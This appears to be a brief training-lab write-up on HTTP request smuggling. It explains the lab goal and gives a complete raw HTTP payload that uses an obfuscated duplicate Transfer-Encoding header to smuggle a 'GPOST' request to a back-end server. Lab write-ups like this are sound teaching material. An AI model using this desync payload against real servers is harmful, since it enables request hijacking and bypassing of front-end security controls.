
# HTTP request smuggling, obfuscating the TE header

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

It is necessary to add the header "Transfer-encoding: cow":

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

26
GPOST / HTTP/1.1
Content-Length: 10

0


```
